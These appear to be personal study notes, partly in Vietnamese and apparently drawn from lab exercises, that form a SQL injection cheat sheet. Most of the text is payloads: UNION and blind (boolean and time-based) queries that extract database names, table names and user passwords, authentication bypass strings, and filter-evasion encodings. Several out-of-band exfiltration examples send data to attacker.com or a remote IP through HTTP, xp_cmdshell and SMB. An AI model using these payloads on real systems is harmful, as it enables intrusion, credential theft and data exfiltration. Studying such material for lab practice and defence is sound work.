
## In-Band SQLi
- website sử dụng query string (id=?) và hiển thị data ra màn hình (GET)
- chèn union vào query string để truy vấn các thông tin cần thiết
	- `1 UNION SELECT 1,2,..n`dò xem kết quả truy vấn có mấy cột
	- `0 UNION SELECT 1,2,database()`: dò tên db
	- `0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'`: dò các table
	- `0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'  -- -:` dò các cột table
	- `0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users -- -`: display ra dữ liệu	
### Blind SQLi
- ko biết kết quả trả về của truy vấn
##### Authentication Bypass
- Chèn sql vào password để always true
	- `' OR 1=1;--`
	- `username=admin'--`: dò username nếu input bị lọc các từ như OR hay UNION
	- Nhớ thêm `--` để comment lại các điều kiện phía sau
##### Boolean Based
- Response chỉ trả về true/false, sử dụng query string (username=?)
	- xác định đc 1 giá trị (username) trả về false (admin123)
	- admin123' UNION SELECT 1,2,3;--: mò cột của truy vấn
	- admin123' UNION SELECT 1,2,3 where database() like 's%';-- : mò từng ký tự của db
	- admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--: mò từng ký tự của table
	- admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%'; : dò cột
	- Khi dò cột nhớ thêm các cột đã tìm thấy vào condition để tránh bị trùng 
		- admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';
	- admin123' UNION SELECT 1,2,3 from users where username like 'a%: dò username
	- admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%: dò password
##### Time-Based
- Dựa vào thời gian response của truy vấn và hàm SLEEP (hàm này delay truy vấn khi truy vấn này đúng)
	- admin123' UNION SELECT SLEEP(5),2;--: dò cột
	- admin123' UNION SELECT SLEEP(1),2 where database() like 'sqli%';--: dò tên db
	- admin123' UNION SELECT  SLEEP(1), 2 FROM information_schema.tables WHERE table_schema = 'sqli_four' and table_name like 'users%' ;--: mò từng ký tự của table
	- admin123' UNION SELECT  SLEEP(1), 2 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_four' and TABLE_NAME='users' and COLUMN_NAME like 'a%'; : dò cột
	- admin123' UNION SELECT SLEEP(1), 2 FROM users where username like 'admin%';--: dò username
	- admin123' UNION SELECT SLEEP(1), 2 FROM users where username = 'admin' and password like '4961%';-- : dò password
## Out-In-Band SQLi
#### OOB
##### Techniques in Different Databases
- **MySQL and MariaDB**: `SELECT sensitive_data FROM users INTO OUTFILE '/tmp/out.txt';
- **Microsoft SQL Server (MSSQL)**: `EXEC xp_cmdshell 'bcp "SELECT sensitive_data FROM users" queryout "\\10.10.58.187\logs\out.txt" -c -T';
- **Oracle**: 
```
DECLARE
  req UTL_HTTP.REQ;
  resp UTL_HTTP.RESP;
BEGIN
  req := UTL_HTTP.BEGIN_REQUEST('http://attacker.com/exfiltrate?sensitive_data=' || sensitive_data);
  UTL_HTTP.GET_RESPONSE(req);
END;
```
##### Examples of Out-of-band Techniques
- **HTTP Requests**: `SELECT http_post('http://attacker.com/exfiltrate', sensitive_data) FROM books;`
- **DNS Exfiltration**
- **SMB Exfiltration**:
	- Navigate to `impacket` directory using `cd /opt/impacket/examples`
	- Enter the command `python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support -comment "My Logs Server" -debug logs /tmp` to start the SMB server sharing the `/tmp` directory.
	- You can access the contents of the network share by entering the command `smbclient //YOUR_IP/logs -U guest -N`. This would allow you to connect to the network share, and then you can issue the command `ls` to list all the commands.
	- payload: `1'; SELECT @@version INTO OUTFILE '\\\\YOUR_IP\\logs\\out.txt'; --
		- có thể thay `@@version` thành `@@basedir`
## SQLite Injection Tricks
- `sqlite_master`: có thể truy vấn từ chỗ này được type, name, tbl_name, rootpage, **sql** (quan trọng nhất) 
## Filter Evasion Techniques
##### Character Encoding
- **URL Encoding**: using a percent (%) sign followed by their ASCII value in hexadecimal. For example, the payload `' OR 1=1--` can be encoded as `%27%20OR%201%3D1--`, `%27%20%7C%7C%201%3D1%20--`
- **Hexadecimal Encoding**: the query `SELECT * FROM users WHERE name = 'admin'` can be encoded as `SELECT * FROM users WHERE name = 0x61646d696e`
- **Unicode Encoding**: the string `admin` can be encoded as `\u0061\u0064\u006d\u0069\u006e`
##### No-Quote SQL Injection
- **Using Numerical Values**
- **Using SQL Comments**
	- **Using SQL Comments**: For example, `CONCAT(0x61, 0x64, 0x6d, 0x69, 0x6e)` constructs the string admin
##### No Spaces Allowed
- **Comments to Replace Spaces**: For example, instead of `SELECT * FROM users WHERE name = 'admin'`, an attacker can use `SELECT/**/*FROM/**/users/**/WHERE/**/name/**/='admin'`
- **Tab or Newline Characters**: `\t`, `\n`, example: `SELECT\t*\tFROM\tusers\tWHERE\tname\t=\t'admin'`
- **Alternate Characters**: 
	- `%09` (horizontal tab), `%0A` (line feed), `%0C` (form feed), `%0D` (carriage return), and `%A0` (non-breaking space)
	- `%27%0A||%0A1=1%0A--%27+`: sample payload
## Other Techniques
##### HTTP Header Injection
- `User-Agent: ' UNION SELECT book_id,flag FROM books; #`
##### Exploiting Stored Procedures
```
CREATE PROCEDURE sp_getUserData
    @username NVARCHAR(50)
AS
BEGIN
    DECLARE @sql NVARCHAR(4000)
    SET @sql = 'SELECT * FROM users WHERE username = ''' + @username + ''''
    EXEC(@sql)
END
```
##### XML and JSON Injection
```
{
  "username": "admin' OR '1'='1--",
  "password": "password"
}
```
## Important Tools
- **[SQLMap](https://github.com/sqlmapproject/sqlmap)**: SQLMap is an open-source tool that automates the process of detecting and exploiting SQL Injection vulnerabilities in web applications. It supports a wide range of databases and provides extensive options for both identification and exploitation. You can learn more about the tool [here](https://tryhackme.com/r/room/sqlmap).
- **[SQLNinja](https://github.com/xxgrunge/sqlninja)**: SQLNinja is a tool specifically designed to exploit SQL Injection vulnerabilities in web applications that use Microsoft SQL Server as the backend database. It automates various stages of exploitation, including database fingerprinting and data extraction. 
- [**JSQL Injection**](https://github.com/ron190/jsql-injection): A Java library focused on detecting SQL injection vulnerabilities within Java applications. It supports various types of SQL Injection attacks and provides a range of options for extracting data and taking control of the database.
- **[BBQSQL](https://github.com/CiscoCXSecurity/bbqsql)**: BBQSQL is a Blind SQL Injection exploitation framework designed to be simple and highly effective for automated exploitation of Blind SQL Injection vulnerabilities.
## Tricks
- Nếu OR bị lọc thì hãy thử dùng ||

|Scenario|Description|Example|
|---|---|---|
|Keywords like **SELECT** are banned|SQL keywords can often be bypassed by changing their case or inserting inline comments to break them up.|`SElEcT * FrOm users``SE/**/LECT * FROM/**/users`|
|**Spaces** are banned|Use alternative whitespace (URL-encoded newlines/tabs) or comments to replace spaces.|`SELECT%0A*%0AFROM%0Ausers``SELECT/**/**/ * /**/**/FROM/**/users`|
|Logical operators like **AND, OR** are banned|Use alternative logical operators or concatenation to bypass keyword filters.|`username='admin' && password='password'``username='admin'/**/|
|Common keywords like **UNION, SELECT** are banned|Use equivalent representations such as hexadecimal or Unicode encoding to bypass filters.|`SElEcT * FROM users WHERE username = CHAR(0x61,0x64,0x6D,0x69,0x6E)`|
|Specific keywords like **OR, AND, SELECT, UNION** are banned|Use obfuscation to disguise keywords (string functions, splitting with comments).|`SElEcT * FROM users WHERE username = CONCAT('a','d','m','i','n')``SElEcT/**/username/**/FROM/**/users`|
- 
